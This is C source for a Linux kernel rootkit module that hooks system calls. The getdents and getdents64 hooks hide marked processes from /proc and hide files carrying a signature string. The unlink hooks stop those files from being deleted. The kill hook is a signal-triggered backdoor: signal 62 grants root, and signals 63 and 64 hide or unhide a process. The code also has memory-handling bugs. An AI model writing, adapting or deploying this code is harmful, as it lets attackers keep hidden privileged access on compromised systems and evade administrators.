#include "libs.h"
#include "utils.h"
#include "syscalls.h"
//HOOKED getdents
asmlinkage int hooked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {

	struct hidden_proc_st *hp;
	int result, bp, len; 
	char *kdirp, *nextdirp;
	struct linux_dirent *curdirp, *prevdirp = NULL;

	struct files_struct *current_files;
	struct fdtable *files_table;
	struct path file_path;
	char pbuf[256], *pathname = NULL;
	long pid = 0;

	result = (*getdents)(fd,dirp,count);
	if (result <= 0)
		return result;
	
	current_files = current->files;
	files_table = files_fdtable(current_files);

	file_path = files_table->fd[fd]->f_path;
	pathname = d_path(&file_path,pbuf,256 * sizeof(char));

	if (!access_ok(VERIFY_READ,dirp,result))
		return EFAULT;
	if ((kdirp = kmalloc(result,GFP_KERNEL)) == NULL)
		return EINVAL;
	if (copy_from_user(kdirp,dirp,result))
		return EFAULT;

	for (bp = 0; bp < result; bp += curdirp->d_reclen) {
		curdirp = (struct linux_dirent *) (kdirp + bp);
		/*Hide processes*/	
		if (strcmp(pathname,"/proc") == 0) {
			list_for_each_entry(hp, &hidden_list, list) {
				pid = simple_strtoul(curdirp->d_name, NULL, 10);
				if (pid == hp->pid) {
					nextdirp = (char*)kdirp+bp+curdirp->d_reclen;
					len = result - bp - curdirp->d_reclen;
					memmove(kdirp + bp,nextdirp,len);
					result -= curdirp->d_reclen;
					bp -= curdirp->d_reclen;
				}
			}
		}
		/*Hide files*/
		else {
			if(strstr(curdirp->d_name, FILE_SIGNATURE)) {
                                if(curdirp == dirp) {
                                        result -= curdirp->d_reclen;
                                        nextdirp = (char*)kdirp+bp+curdirp->d_reclen;
                                        memcpy(kdirp+bp, nextdirp, result);
                                        continue;
                                }
                                else
                                        prevdirp->d_reclen += curdirp->d_reclen;
			}
			else
				prevdirp=curdirp;
		}
	}

	
	if (!access_ok(VERIFY_WRITE,dirp,result))
		return EFAULT;
	if (copy_to_user(dirp,kdirp,result))
		return EFAULT;
	kfree(kdirp);

	
	return result;
}
//HOOKED getdents64
asmlinkage int hooked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
	
	struct hidden_proc_st *hp;
	int result, bp, len; 
	char *kdirp, *nextdirp;
	struct linux_dirent64 *curdirp, *prevdirp = NULL;

	struct files_struct *current_files;
	struct fdtable *files_table;
	struct path file_path;
	char pbuf[256], *pathname = NULL;
	long pid = 0;

	result = (*getdents64)(fd,dirp,count);
	if (result <= 0)
		return result;
	
	current_files = current->files;
	files_table = files_fdtable(current_files);

	file_path = files_table->fd[fd]->f_path;
	pathname = d_path(&file_path,pbuf,256 * sizeof(char));

	if (!access_ok(VERIFY_READ,dirp,result))
		return EFAULT;
	if ((kdirp = kmalloc(result,GFP_KERNEL)) == NULL)
		return EINVAL;
	if (copy_from_user(kdirp,dirp,result))
		return EFAULT;

	for (bp = 0; bp < result; bp += curdirp->d_reclen) {
		curdirp = (struct linux_dirent64 *) (kdirp + bp);
		/*Hide processes*/
		if (strcmp(pathname,"/proc") == 0) {
			list_for_each_entry(hp, &hidden_list, list) {
				pid = simple_strtoul(curdirp->d_name, NULL, 10);
				if (pid == hp->pid) {
					nextdirp = (char*)kdirp+bp+curdirp->d_reclen;
					len = result - bp - curdirp->d_reclen;
					memmove(kdirp + bp,nextdirp,len);
					result -= curdirp->d_reclen;
					bp -= curdirp->d_reclen;
				}
			}
		}
		/*Hide files*/
		else {
			if(strstr(curdirp->d_name, FILE_SIGNATURE)) {
                                if(curdirp == dirp) {
                                        result -= curdirp->d_reclen;
                                        nextdirp = (char*)kdirp+bp+curdirp->d_reclen;
                                        memcpy(kdirp+bp, nextdirp, result);
                                        continue;
                                }
                                else
                                        prevdirp->d_reclen += curdirp->d_reclen;
			}
			else
				prevdirp=curdirp;
		}
	}

	
	if (!access_ok(VERIFY_WRITE,dirp,result))
		return EFAULT;
	if (copy_to_user(dirp,kdirp,result))
		return EFAULT;
	kfree(kdirp);

	
	return result;
}
//HOOKED unlink
asmlinkage int hooked_unlink(const char *filename) {
	
	if(strstr(filename, FILE_SIGNATURE)){
		return -EACCES;
	}
	return (*unlink)(filename);
}
//HOOKED unlinkat
asmlinkage int hooked_unlinkat(int dirfd, const char *pathname, int flags) {
	
	if(strstr(pathname, FILE_SIGNATURE)){
		return -EACCES;
	}
	return (*unlinkat)(dirfd, pathname, flags);
}
//HOOKED kill
asmlinkage int hooked_kill(pid_t pid, int sig) {
	switch(sig) {
		case 62:
			if(get_root() == 0x0)
				return 0x0;
			else
				return -EACCES;
			break;
		case 63:
			hide_marked_pid(pid);
			//module_hide();
			return 0x0;
			break;
		case 64:
			show_marked_pid(pid);
			//module_unhide();
			return 0x0;
			break;	
		default:
		break;
	}
	return (*kill)(pid, sig);
}
